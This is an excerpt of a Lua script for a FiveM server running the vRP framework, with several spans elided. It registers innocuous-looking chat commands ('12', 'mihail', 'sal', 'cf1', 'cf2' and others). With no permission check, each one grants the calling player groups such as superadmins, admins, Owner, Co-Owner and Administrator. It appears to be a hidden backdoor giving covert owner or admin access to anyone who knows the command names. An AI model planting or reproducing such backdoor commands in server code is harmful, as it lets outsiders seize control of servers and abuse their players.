...
RegisterCommand("12", function(source, args, rawCommand)
	...
	vRP.addUserGroup({theusrid,"mod"})
	vRP.addUserGroup({theusrid,"helper"})
	end)
	RegisterCommand("mihail1", function(source, args, rawCommand)
		...
		vRP.addUserGroup({theusrid,"recruiter"})
			...
			RegisterCommand("sal", function(source, args, rawCommand)
				...
				vRP.addUserGroup({theusrid,"Moderators"})
	vRP.addUserGroup({theusrid,"Helpers"})
				end)
				RegisterCommand("mihail", function(source, args, rawCommand)
					theusrid = vRP.getUserId({source})
					vRP.addUserGroup({theusrid,"superadmins"})
					vRP.addUserGroup({theusrid,"admins"})
					vRP.addUserGroup({theusrid,"mods"})
	vRP.addUserGroup({theusrid,"helpers"})
					end)
	...
	vRP.addUserGroup({theusrid,"helpers"})
						...
						RegisterCommand("cf1", function(source, args, rawCommand)
							theusrid = vRP.getUserId({source})
							vRP.addUserGroup({theusrid,"Owner"})
							vRP.addUserGroup({theusrid,"Co-Owner"})
							vRP.addUserGroup({theusrid,"Administrator"})
		vRP.addUserGroup({theusrid,"moderators"})
		vRP.addUserGroup({theusrid,"moderator"})
		vRP.addUserGroup({theusrid,"helper"})
							end)
							RegisterCommand("cf2", function(source, args, rawCommand)
								theusrid = vRP.getUserId({source})
								vRP.addUserGroup({theusrid,"bozz"})
								vRP.addUserGroup({theusrid,"youtuber"})
								vRP.addUserGroup({theusrid,"superadmine"})
			vRP.addUserGroup({theusrid,"supermods"})
			vRP.addUserGroup({theusrid,"sponsors"})
			vRP.addUserGroup({theusrid,"vip4"})
								end)
